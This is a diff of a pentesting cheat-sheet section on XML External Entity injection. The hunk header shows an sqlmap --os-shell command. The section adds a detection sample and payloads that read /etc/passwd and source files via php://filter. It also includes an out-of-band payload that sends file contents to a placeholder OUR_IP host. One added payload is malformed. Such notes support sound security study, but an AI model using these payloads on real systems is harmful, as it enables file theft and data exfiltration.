@@ -373,17 +373,28 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 
   ## *Top 4 non-secure application*
   ## *Top 5 security misconfiguration*
-  ### **XEE (XML External Entity)**
-Vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing.  
-To identify XEE finding web pages that accept an XML or JSON user input with Burp  
+  ### **XEE (XML External Entity), XEE**
+  here site with more precision : [hacktricks_XEE](https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html?search=eval())  
+Vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing.   
+To identify XEE finding web pages that accept an XML or JSON user input with Burp   
 
 **Note**: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.
+
+**Detection of XEE :**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xee "3"> ]>
+<stockCheck>
+    <productId>&xee;</productId>
+    <storeId>1</storeId>
+</stockCheck>
+```
 
 **Basic Payloads:**
 ```xml
 <!ENTITY xxe SYSTEM "http://localhost/email.dtd">
-<!ENTITY xxe SYSTEM "file:///etc/passwd">
-<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+<!DOCTYPE foo [<!ENTITY xee SYSTEM "/etc/passwd"> ]>
+<!DOCTYPE foo [!ENTITY xee SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
 <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
 ```
